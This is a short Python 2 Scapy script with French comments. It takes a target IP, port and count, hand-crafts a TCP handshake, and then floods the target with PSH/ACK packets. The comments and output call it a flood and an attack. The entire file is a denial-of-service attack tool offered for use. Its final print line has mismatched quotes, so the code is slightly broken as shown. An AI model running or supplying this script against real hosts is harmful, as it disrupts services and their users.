#-*-coding:Utf-8-*-
from scapy.all import *
import sys
from random import randint
#-------------------------------------
#
#
#-------------------------------------

if len(sys.argv) < 4:
    print 'Syntaxe ; !/*.py ipCible portCible nbAck'
    exit(0)
ipCible = sys.argv[1] #Récupération des paramètres
portCible = int(sys.argv[2])
portDep = randint(1,65535)
nbAck = int(sys.argv[3])
ans, unans = sr(IP(dst = ipCible)/TCP(dport = portCible,sport = portDep,flags = 'S')) #Envoi du paquet Syn
for s,r in ans:
    numAck = r[TCP].seq + 1
    numSeq = r[TCP].ack
    send(IP(dst = ipCible)/TCP(dport = portCible, sport = r[TCP].dport,flags = 'A',seq = numSeq, ack = numAck)) #Envoi du paquet ACK
    print 'Connection établie !'
i = 0
while i < nbAck: # Début du flood
    send(IP(dst = ipCible)/TCP(dport = portCible, sport = portDep, flags = 'PA'))
    i = i + 1
print '--- fin de l'attaque '